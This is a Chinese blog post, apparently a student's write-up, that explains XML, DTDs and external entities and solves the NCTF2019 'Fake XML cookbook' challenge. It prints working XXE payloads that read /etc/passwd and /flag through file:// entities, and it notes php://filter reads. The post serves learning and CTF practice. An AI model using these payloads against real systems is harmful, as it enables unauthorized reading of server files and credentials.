@@ -1,0 +1,452 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>初识xml以及xxe——xml外部实体注入 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-06">2021-04-06</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">初识XML以及xxe——XML外部实体注入</h2>
+            <div class="post-meta">
+                emm... 6426 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天学到了一个新的知识点：xxe漏洞，也就是XML外部实体注入。   </p>
+<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>其实题目已经提示的很清楚了，这道题目和XML有关，可是做这道题目之前根本不知道什么是XML，对着题目只能挠头，没办法，只能先简单学习一下这个新的知识点了。  </p>
+<p>具体学习参考的博客会放在下面，这里就简单讲一下我的理解。  </p>
+<pre><code>什么是 XML？
+XML 指可扩展标记语言（EXtensible Markup Language）。
+XML 的设计宗旨是传输数据，而不是显示数据。
+XML 是 W3C 的推荐标准。
+XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。
+XML 语言没有预定义的标签。
+
+XML 和 HTML 之间的差异
+XML 不是 HTML 的替代。
+XML 和 HTML 为不同的目的而设计：
+
+XML 被设计用来传输和存储数据，其焦点是数据的内容。
+HTML 被设计用来显示数据，其焦点是数据的外观。
+HTML 旨在显示信息，而 XML 旨在传输信息。
+
+为什么需要XML
+现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。  </code></pre>
+<p>简单来说，xml就是用来传输和储存数据的一种语言。而它的格式和基本语法如下：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;
+&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;
+&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;
+&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;
+&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;
+&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;
+&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;
+&lt;/book&gt;                                                 &lt;!--book的结束--&gt;
+&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;  
+
+基本语法：
+
+所有 XML 元素都须有关闭标签。
+XML 标签对大小写敏感。
+XML 必须正确地嵌套。
+XML 文档必须有根元素。
+XML 的属性值须加引号。</code></pre>
+<p>可以看到这个语言和html语言有点像，而这个XML外部实体注入注入方式就是利用程序解析XML输入时，没有进制外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。    </p>
+<p>说白了也就是防御不严，导致恶意的XML代码被执行了。这一点我们可以想到之前学习到的xxs攻击，它也是恶意的js代码被执行而导致的漏洞，他们两个这一点上还是有一定相似的。  </p>
+<p>那么我们说的外部实体注入中的外部实体指的是什么呢？在讲这个之前，我们要再了解一下另一个概念：<strong>DTD</strong>  </p>
+<pre><code>DTD基本概念
+XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。
+DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。
+
+实体引用
+XML元素以形如 &lt;tag&gt;foo&lt;/tag&gt; 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &#39; &quot; 。
+
+实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。
+dtd的引入方式
+
+DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。  </code></pre>
+<p>简单来讲这个DTD的实体引用有点像我敲c++代码时最开始的include和定义变量的结合，它既定义了元素的类型，又能引用资源（类似于代码中引用一些库）。  </p>
+<p>下面看一下内部引用的示例代码   </p>
+<pre><code>&lt;!DOCTYPE 根元素名称 [元素声明]&gt;  
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
+]&gt;
+&lt;note&gt;
+&lt;to&gt;Y0u&lt;/to&gt;
+&lt;from&gt;@re&lt;/from&gt;
+&lt;head&gt;v3ry&lt;/head&gt;
+&lt;body&gt;g00d!&lt;/body&gt;
+&lt;/note&gt;  </code></pre>
+<p>外部引用如下：  </p>
+<pre><code>（1）引入外部的dtd文件
+
+&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;
+
+（2）使用外部的dtd文件(网络上的dtd文件)
+
+&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>
+<p>当使用外部DTD时，通过如下语法引入：</p>
+<pre><code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;
+
+示例代码：
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;Y0u&lt;/to&gt;
+&lt;from&gt;@re&lt;/from&gt;
+&lt;head&gt;v3ry&lt;/head&gt;
+&lt;body&gt;g00d!&lt;/body&gt;
+&lt;/note&gt;
+
+test.dtd
+
+&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>
+<p>接下来就是DTD实体了，也就是本次XML外部实体注入的关键  </p>
+<pre><code>DTD实体
+
+    实体是用于定义引用普通文本或特殊字符的快捷方式的变量。
+    实体引用是对实体的引用。
+    实体可在内部或外部进行声明。
+
+按实体有无参分类，实体分为一般实体和参数实体
+一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;
+引用一般实体的方法：&amp;实体名称;
+ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。
+
+参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;
+引用参数实体的方法：%实体名称;
+ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。
+DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。  </code></pre>
+<p>首先我们先来看内部声明实体的代码：  </p>
+<pre><code>内部实体
+
+&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+
+内部实体示例代码：
+
+&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY writer &quot;Dawn&quot;&gt;
+&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
+]&gt;
+&lt;test&gt;&amp;writer;©right;&lt;/test&gt;  </code></pre>
+<p>可以看到，这里引用了名称为writer和copyright的DTD实体，而这些实体中就有关于普通文本或特殊字符的快捷方式的引用和定义。  </p>
+<p>再接着我们来看一下外部引用：   </p>
+<pre><code>外部实体
+外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。
+
+&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
+或者
+&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;
+
+外部实体示例代码：
+
+&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+]&gt;
+&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre>
+<p>这个其实和上面的没有特别大的不同，只不过这个是用来引用外部的实体资源罢了，但是外部实体可支持http、file等协议，所以利用一些常见的协议：   </p>
+<pre><code>file://文件绝对路径 如：file:///etc/passwd
+http://url/file.txt
+php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
+<p>那么大致知道这些后我们就可以理出来XML外部注入的原理了，如果程序没有禁止外部引入，并且我们上传数据和文件没有进行过滤且我们可以控制，那么我们就可以构造payload读取任意文件并且使使我们的DTD实体变成读取的文件，最后返回到xml中去。   </p>
+<p>下面用一道题来讲解一下：  </p>
+<p>打开题目，发现是一个登陆界面  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/606f34008322e6675c846e30.png"><img src="https://img.imgdb.cn/item/606f34008322e6675c846e30.png"></a>  </p>
+<p>经过尝试发现不是sql注入，那么进行抓包分析：  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/606f343a8322e6675c849bb0.png"><img src="https://img.imgdb.cn/item/606f343a8322e6675c849bb0.png"></a>  </p>
+<p>看的出来时xml形式来传递数据username和password的，那么我们尝试能否外部注入。   </p>
+<p>这样构造payload：   </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+ ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;  </code></pre>
+<p>可以看到，这里我们外部引用了名称为xxe的DTD实体，这个实体是来自我们使用file://协议读取/etc/passwd下的文件，那么在 xml 中 &xxe; 变成了外部文件/etc/passwd中内容，这也就导致了文件信息的泄露。  </p>
+<p>可以看到回显显示我们成功读取到了文件下的内容  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/606f35958322e6675c85c91c.png"><img src="https://img.imgdb.cn/item/606f35958322e6675c85c91c.png"></a>  </p>
+<p>那么接下来我们就可以按照这个方法来读取flag文件，按照做题经验，flag一般都在根目录，那么我们构造payload。  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;
+ ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;  </code></pre>
+<p>确实得到flag。   </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/606f360a8322e6675c863516.png"><img src="https://img.imgdb.cn/item/606f360a8322e6675c863516.png"></a>  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道xxe题目算是最简单的题目了，有回显，没有过滤什么的，其实关于xxe还有很多知识，这道题目只能算是开了个头，让我认识到了这样的攻击方式，以后还是要通过不断积累来攒够经验。  </p>
+<p>下面附上学习xxe的博客，还是要多看：  </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887#toc-0">从XML相关一步一步到XXE漏洞</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
